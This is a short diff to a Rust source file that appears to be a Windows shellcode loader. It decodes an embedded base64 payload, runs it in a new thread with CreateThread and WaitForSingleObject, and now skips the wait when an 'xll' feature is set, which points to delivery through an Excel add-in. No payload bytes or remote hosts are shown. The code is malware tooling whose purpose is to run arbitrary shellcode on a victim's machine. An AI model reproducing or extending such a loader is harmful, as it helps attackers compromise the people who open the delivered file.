@@ -30,6 +30,7 @@ use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
 //     general_purpose::STANDARD.decode(base64_shell_code).unwrap()
 // }
 
+#[warn(dead_code)]
 fn get_shell_code_base64() -> Vec<u8> {
     let base64_shell_code = include_str!("payload.b64");
     general_purpose::STANDARD.decode(base64_shell_code).unwrap()
@@ -40,7 +41,7 @@ fn get_shell_code_base64() -> Vec<u8> {
 //     raw.to_vec()
 // }
 
-
+#[warn(dead_code)]
 pub fn do_load()
 {
     let shell_code = get_shell_code_base64();
@@ -54,6 +55,7 @@ pub fn do_load()
     }
 }
 
+#[warn(dead_code)]
 fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
     unsafe {
 
@@ -91,6 +93,7 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
         
         debug!("[+] Thread started ! {:?}",thread_handle);
 
+        #[cfg(not(feature = "xll"))]
         WaitForSingleObject(thread_handle, WAIT_FAILED);
 
         debug!("[+] Wait stoped !");
